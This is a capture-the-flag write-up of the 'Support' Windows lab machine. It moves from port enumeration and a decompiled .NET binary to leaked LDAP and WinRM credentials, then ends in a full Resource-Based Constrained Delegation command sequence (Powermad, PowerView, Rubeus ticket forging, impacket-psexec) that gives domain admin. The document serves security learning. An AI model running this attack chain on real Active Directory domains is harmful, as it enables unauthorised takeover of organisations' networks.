+++
title = 'Support'
description = 'Easy Windows'
writeup = true
hideMeta = true
+++

nmap scan.

![Support (Easy Windows).png](Support%20%28Easy%20Windows%29.png)

- 53 - DNS
- 88 - MS Windows Kerberos
- 135 - MS Windows RPC
- 139 - MS Windows netbios-ssn
- 389 - MS Windows Active Directory LDAP
- 445 - ?
- 464 - ?
- 593 - MS Windows RPC over HTTP 1.0
- 636 - ?
- 3268 - MS Windows Active Directory LDAP
- 3269 - ?
- 5985 - MS HTTPAPI httpd 2.0 (SSDP/UPnP)
- 9389 - .NET Message Framing
- 49664 - MS Windows RPC
- 49667 - MS Windows RPC
- 49678 - MS Windows RPC over HTTP 1.0
- 49683 - MS Windows RPC
- 49707 - MS Windows RPC

Running `enum4linux` because we have the netbios port:

![Support (Easy Windows)-1.png](Support%20%28Easy%20Windows%29-1.png)

Domain name: `SUPPORT`. Domain SID: `S-1-5-21-1677581083-3380853377-188903654`.

Most of the other information comes back ACCESS DENIED - looks like we need to find some credentials.

The following shares are present (using `smbclient -L`):

![Support (Easy Windows)-2.png](Support%20%28Easy%20Windows%29-2.png)

`support-tools` is not a default share.

![Support (Easy Windows)-3.png](Support%20%28Easy%20Windows%29-3.png)

![Support (Easy Windows)-4.png](Support%20%28Easy%20Windows%29-4.png)

![Support (Easy Windows)-5.png](Support%20%28Easy%20Windows%29-5.png)

The binary file is a .NET executable. On Linux there are two ways to proceed: decompile it, or use `wine` to attempt to run it.

ILSpy - https://github.com/icsharpcode/AvaloniaILSpy/releases

Using ILSpy to look at the decompiled binary:

![Support (Easy Windows)-6.png](Support%20%28Easy%20Windows%29-6.png)

Exploring it finds a password encoded - and also the algorithm to decode it.

![Support (Easy Windows)-7.png](Support%20%28Easy%20Windows%29-7.png)

`0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`

![Support (Easy Windows)-8.png](Support%20%28Easy%20Windows%29-8.png)

`armando` is the key.

![Support (Easy Windows)-10.png](Support%20%28Easy%20Windows%29-10.png)

![Support (Easy Windows)-9.png](Support%20%28Easy%20Windows%29-9.png)

The executable does an LDAP query - it attempts to connect to a remote LDAP server and obtain user information.

Added `support.htb` to the hosts file.

![Support (Easy Windows)-11.png](Support%20%28Easy%20Windows%29-11.png)

With the password we now have, `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`, we can attempt to authenticate to the LDAP server. From the query code, we can see the username is `ldap`.

![Support (Easy Windows)-12.png](Support%20%28Easy%20Windows%29-12.png)

```bash
ldapsearch -x -H ldap://support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb"
```

![Support (Easy Windows)-13.png](Support%20%28Easy%20Windows%29-13.png)

![Support (Easy Windows)-14.png](Support%20%28Easy%20Windows%29-14.png)

![Support (Easy Windows)-15.png](Support%20%28Easy%20Windows%29-15.png)

The `info:` section looks like it contains a password for `support` - `Ironside47pleasure40Watchful`.

We also see that `support` is part of the `Remote Management Users` group.

![Support (Easy Windows)-16.png](Support%20%28Easy%20Windows%29-16.png)

WinRM is running on the box - port 5985 was running HTTP in the nmap scan.

![Support (Easy Windows)-17.png](Support%20%28Easy%20Windows%29-17.png)

## Privilege Escalation

Looked around a bit - but there isn't much here and I didn't really know what I was doing. I didn't understand enough about how Windows and Active Directory work to attempt this privesc. Planned to finish the box with help at the office and do a course or something to really learn Windows privesc and AD attacks.

I'm back.

Considering we've compromised a domain user, let's run BloodHound:

```bash
bloodhound-python -d support.htb -u support@support.htb -p Ironside47pleasure40Watchful -gc support.htb -c all -ns 10.129.230.181
```

![Support (Easy Windows)-18.png](Support%20%28Easy%20Windows%29-18.png)

Import the JSON files into BloodHound for viewing.

![Support (Easy Windows)-19.png](Support%20%28Easy%20Windows%29-19.png)

Looking for a path to administrator - there is one:

![Support (Easy Windows)-20.png](Support%20%28Easy%20Windows%29-20.png)

That's because `support@support.htb` is part of the Shared Support Accounts group, which has **GenericAll** privileges on `DC.SUPPORT.HTB` - the domain controller, which obviously controls everything including Administrator.

![Support (Easy Windows)-21.png](Support%20%28Easy%20Windows%29-21.png)
![Support (Easy Windows)-22.png](Support%20%28Easy%20Windows%29-22.png)

Essentially BloodHound mentions we can perform a **Resource-Based Constrained Delegation** attack to escalate.

# Resource-Based Constrained Delegation attack

In a nutshell, through a Resource-Based Constrained Delegation attack we can add a computer under our control to the domain - let's call it `$FAKE-COMP01` - and configure the Domain Controller to allow `$FAKE-COMP01` to act on behalf of it. Then, acting on behalf of the DC, we can request Kerberos tickets for `$FAKE-COMP01` with the ability to impersonate a highly privileged user such as Administrator. Once the tickets are generated, we can Pass the Ticket (PtT) and authenticate as that user, giving us control over the entire domain.

The attack relies on three prerequisites:

- A shell or code execution as a domain user in the Authenticated Users group - by default any member can add up to 10 computers to the domain.
- `ms-ds-machineaccountquota` needs to be higher than 0 - it controls how many computers authenticated users can add to the domain.
- Our current user (or a group we're in) needs WRITE privileges (GenericAll, WriteDACL) over a domain-joined computer - in this case the Domain Controller.

From our earlier enumeration we know the `support` user is in Authenticated Users and the Shared Support Accounts group, and that group has GenericAll over the Domain Controller (`dc.support.htb`).

```bash
# Get dependencies for attack
# Powermad
git clone https://github.com/Kevin-Robertson/Powermad.git
cp ~/tools/Powermad/Powermad.ps1 ./Powermad.ps1
# PowerView
sudo apt install powersploit
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ./PowerView.ps1
# Rubeus.exe
cp /usr/share/windows-resources/rubeus/Rubeus.exe ./Rubeus.exe

# Make sure we are able to add machines - needs to be higher than 0
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota

# With evil-winrm
upload Powermad.ps1
upload PowerView.ps1
upload Rubeus.exe

# Import powershell modules
. ./Powermad.ps1
. ./PowerView.ps1

# Following steps on bloodhound
# Create new machine account
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
# Get SID of the account we just created
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
# Build a generic ACE with our added machine account SID as the principal, and get the binary bytes for the new ACE
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
# Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
# Use Rubeus.exe to hash the plaintext password into its RC4_HMAC form
./Rubeus.exe hash /password:Summer2018!
# And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
./Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt

# Copy the last ticket value and save it to ticket.kirbi.b64 in local kali
vim ticket.kirbi.b64 # remember to remove spaces

base64 -d ticket.kirbi.b64 > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache

KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
```

![Support (Easy Windows)-23.png](Support%20%28Easy%20Windows%29-23.png)

![Support (Easy Windows)-24.png](Support%20%28Easy%20Windows%29-24.png)

Domain admin.
